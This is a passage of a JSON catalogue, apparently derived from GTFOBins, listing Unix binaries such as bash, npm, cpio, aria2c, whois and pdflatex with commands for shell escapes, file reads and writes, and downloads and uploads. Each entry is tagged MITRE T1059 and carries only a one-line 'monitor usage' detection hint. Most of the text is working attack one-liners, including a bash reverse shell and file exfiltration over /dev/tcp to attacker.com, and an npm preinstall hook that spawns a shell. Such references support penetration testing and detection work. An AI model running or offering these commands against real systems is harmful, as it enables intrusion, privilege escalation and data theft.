                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rpm usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rpm/"
                }
            ]
        },
        {
            "name": "cpio",
            "description": "Unix binary cpio.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "echo /path/to/input-file | cpio -o"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "echo /path/to/input-file | cpio -dp .\ncat path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\necho /path/to/temp-file | cpio -udp ."
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cpio usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cpio/"
                }
            ]
        },
        {
            "name": "rustup",
            "description": "Unix binary rustup.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\necho '/path/to/command' >/path/to/temp-dir/bin/rustc\nchmod +x /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc"
                },
                {
                    "label": "SHELL: ",
                    "code": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\ncp /bin/sh /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rustup usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rustup/"
                }
            ]
        },
        {
            "name": "join",
            "description": "Unix binary join.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "join -a 2 /dev/null /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor join usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/join/"
                }
            ]
        },
        {
            "name": "code",
            "description": "Unix binary code.",
            "categories": [
                "execute",
                "reverse-shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "code tunnel --name xxxxxx"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "code tunnel --name xxxxxx"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "code tunnel --name xxxxxx"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor code usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/code/"
                }
            ]
        },
        {
            "name": "bconsole",
            "description": "Unix binary bconsole.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "bconsole -c /path/to/file-input"
                },
                {
                    "label": "SHELL: ",
                    "code": "bconsole\n@exec /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bconsole usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bconsole/"
                }
            ]
        },
        {
            "name": "certbot",
            "description": "Unix binary certbot.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor certbot usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/certbot/"
                }
            ]
        },
        {
            "name": "uv",
            "description": "Unix binary uv.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "uv run /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor uv usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/uv/"
                }
            ]
        },
        {
            "name": "fmt",
            "description": "Unix binary fmt.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "fmt -pNON_EXISTING_PREFIX /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "fmt -999 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor fmt usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/fmt/"
                }
            ]
        },
        {
            "name": "date",
            "description": "Unix binary date.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "date -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor date usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/date/"
                }
            ]
        },
        {
            "name": "tee",
            "description": "Unix binary tee.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | tee /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tee usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tee/"
                }
            ]
        },
        {
            "name": "dmidecode",
            "description": "Unix binary dmidecode.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dmidecode usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dmidecode/"
                }
            ]
        },
        {
            "name": "tdbtool",
            "description": "Unix binary tdbtool.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "tdbtool\n! /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tdbtool usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tdbtool/"
                }
            ]
        },
        {
            "name": "uniq",
            "description": "Unix binary uniq.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "uniq /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor uniq usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/uniq/"
                }
            ]
        },
        {
            "name": "last",
            "description": "Unix binary last.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "last -a -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor last usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/last/"
                }
            ]
        },
        {
            "name": "chrt",
            "description": "Unix binary chrt.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "chrt 1 /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor chrt usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/chrt/"
                }
            ]
        },
        {
            "name": "diff",
            "description": "Unix binary diff.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "diff --line-format=%L /dev/null /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "diff --recursive /path/to/empty-dir /path/to/input-dir/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor diff usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/diff/"
                }
            ]
        },
        {
            "name": "mawk",
            "description": "Unix binary mawk.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "mawk '//' /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "mawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"
                },
                {
                    "label": "SHELL: ",
                    "code": "mawk 'BEGIN {system(\"/bin/sh\")}'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mawk usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mawk/"
                }
            ]
        },
        {
            "name": "whois",
            "description": "Unix binary whois.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "whois -h attacker.com -p 12345 x"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "whois -h attacker.com -p 12345 DATA"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor whois usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/whois/"
                }
            ]
        },
        {
            "name": "npm",
            "description": "Unix binary npm.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "npm exec /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nnpm -C . i"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nnpm -C . run xxx"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor npm usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/npm/"
                }
            ]
        },
        {
            "name": "tasksh",
            "description": "Unix binary tasksh.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "tasksh\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tasksh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tasksh/"
                }
            ]
        },
        {
            "name": "psql",
            "description": "Unix binary psql.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "psql\n\\?"
                },
                {
                    "label": "SHELL: ",
                    "code": "psql\n\\! /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor psql usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/psql/"
                }
            ]
        },
        {
            "name": "agetty",
            "description": "Unix binary agetty.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "agetty -l /bin/sh -o -p -a root tty"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor agetty usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/agetty/"
                }
            ]
        },
        {
            "name": "dotnet",
            "description": "Unix binary dotnet.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "dotnet fsi\nSystem.IO.File.ReadAllText(\"/path/to/input-file\");;"
                },
                {
                    "label": "SHELL: ",
                    "code": "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dotnet usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dotnet/"
                }
            ]
        },
        {
            "name": "base58",
            "description": "Unix binary base58.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "base58 /path/to/input-file | base58 --decode"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor base58 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/base58/"
                }
            ]
        },
        {
            "name": "rpmquery",
            "description": "Unix binary rpmquery.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "rpmquery --eval '%{lua:...}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "rpmquery --eval '%(/bin/sh 1>&2)'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rpmquery usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rpmquery/"
                }
            ]
        },
        {
            "name": "flock",
            "description": "Unix binary flock.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "flock -u / /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor flock usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/flock/"
                }
            ]
        },
        {
            "name": "aria2c",
            "description": "Unix binary aria2c.",
            "categories": [
                "execute",
                "file-read"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\naria2c --on-download-error=/path/to/temp-file http://some-invalid-domain"
                },
                {
                    "label": "COMMAND: ",
                    "code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "aria2c -i /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor aria2c usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/aria2c/"
                }
            ]
        },
        {
            "name": "taskset",
            "description": "Unix binary taskset.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "taskset 1 /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor taskset usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/taskset/"
                }
            ]
        },
        {
            "name": "hexdump",
            "description": "Unix binary hexdump.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "hd /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor hexdump usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/hexdump/"
                }
            ]
        },
        {
            "name": "check_raid",
            "description": "Unix binary check_raid.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "check_raid --extra-opts=@/path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor check_raid usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/check_raid/"
                }
            ]
        },
        {
            "name": "mypy",
            "description": "Unix binary mypy.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "mypy /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "mypy /path/to/input-file --junit-xml /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mypy usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mypy/"
                }
            ]
        },
        {
            "name": "aptitude",
            "description": "Unix binary aptitude.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "aptitude changelog aptitude"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor aptitude usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/aptitude/"
                }
            ]
        },
        {
            "name": "pidstat",
            "description": "Unix binary pidstat.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "pidstat -e /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pidstat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pidstat/"
                }
            ]
        },
        {
            "name": "slsh",
            "description": "Unix binary slsh.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "slsh -e 'system(\"/bin/sh\")'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor slsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/slsh/"
                }
            ]
        },
        {
            "name": "crash",
            "description": "Unix binary crash.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "CRASHPAGER=/path/to/command crash -h"
                },
                {
                    "label": "INHERIT: ",
                    "code": "crash -h"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor crash usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/crash/"
                }
            ]
        },
        {
            "name": "fail2ban-client",
            "description": "Unix binary fail2ban-client.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "fail2ban-client add x\nfail2ban-client set x addaction x\nfail2ban-client set x action x actionban /path/to/command\nfail2ban-client start x\nfail2ban-client set x banip 999.999.999.999\nfail2ban-client set x unbanip 999.999.999.999\nfail2ban-client stop x"
                },
                {
                    "label": "COMMAND: ",
                    "code": "cat >/path/to/temp-dir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/path/to/temp-dir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /path/to/temp-dir/action.d/\ncat >/path/to/temp-dir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /path/to/command\nEOF\n\nmkdir -p /path/to/temp-dir/filter.d/\ncat >/path/to/temp-dir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /path/to/temp-dir/ -v restart"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor fail2ban-client usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/fail2ban-client/"
                }
            ]
        },
        {
            "name": "xz",
            "description": "Unix binary xz.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "xz -c /path/to/input-file | xz -d"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xz usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xz/"
                }
            ]
        },
        {
            "name": "vagrant",
            "description": "Unix binary vagrant.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >Vagrantfile\nvagrant up"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor vagrant usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/vagrant/"
                }
            ]
        },
        {
            "name": "zip",
            "description": "Unix binary zip.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "zip /path/to/temp-file /path/to/input-file\nunzip -p /path/to/temp-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zip usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zip/"
                }
            ]
        },
        {
            "name": "vigr",
            "description": "Unix binary vigr.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "vigr"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor vigr usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/vigr/"
                }
            ]
        },
        {
            "name": "scrot",
            "description": "Unix binary scrot.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "scrot -e /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor scrot usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/scrot/"
                }
            ]
        },
        {
            "name": "bash",
            "description": "Unix binary bash.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "bash -c 'echo \"$(</path/to/input-file)\"'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "HISTTIMEFORMAT=$'\\r\\e[K'\nhistory -c\nhistory -r /path/to/input-file\nhistory"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "bash -c 'echo DATA >/path/to/output-file'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "HISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w /path/to/output-file"
                },
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "bash -c 'enable -f /path/to/lib.so x'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'"
                },
                {
                    "label": "SHELL: ",
                    "code": "bash"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "bash -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bash usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bash/"
                }
            ]
        },
        {
            "name": "cat",
            "description": "Unix binary cat.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "cat /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cat/"
                }
            ]
        },
        {
            "name": "redcarpet",
            "description": "Unix binary redcarpet.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "redcarpet /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor redcarpet usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/redcarpet/"
                }
            ]
        },
        {
            "name": "check_by_ssh",
            "description": "Unix binary check_by_ssh.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor check_by_ssh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/check_by_ssh/"
                }
            ]
        },
        {
            "name": "pdflatex",
            "description": "Unix binary pdflatex.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\npdftotext texput.pdf -"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "pdflatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pdflatex usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pdflatex/"
                }
            ]
        },
        {
            "name": "gzip",
            "description": "Unix binary gzip.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
